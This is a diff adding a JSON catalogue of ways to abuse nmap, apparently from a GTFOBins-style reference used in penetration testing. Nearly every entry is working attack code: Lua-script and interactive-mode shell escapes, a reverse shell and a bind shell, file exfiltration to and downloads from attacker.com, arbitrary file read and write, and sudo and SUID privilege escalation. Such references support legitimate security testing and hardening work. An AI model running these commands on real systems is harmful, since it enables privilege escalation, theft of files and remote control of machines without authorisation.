@@ -1,0 +1,86 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n"
+      },
+      {
+        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
+        "code": "nmap --interactive\nnmap> !sh\n"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "non-interactive-bind-shell": [
+      {
+        "description": "Run `nc target.com 12345` on the attacker box to connect to the shell.",
+        "code": "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
+        "code": "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n"
+      },
+      {
+        "description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
+        "code": "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n"
+      },
+      {
+        "description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
+        "code": "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"
+      },
+      {
+        "description": "The payload appears inside the regular nmap output.",
+        "code": "LFILE=file_to_write\nnmap -oG=$LFILE DATA\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"
+      },
+      {
+        "description": "The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",
+        "code": "nmap -iL file_to_read\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"
+      },
+      {
+        "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
+        "code": "sudo nmap --interactive\nnmap> !sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "Input echo is disabled.",
+        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "The payload appears inside the regular nmap output.",
+        "code": "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
+      }
+    ]
+  }
+}
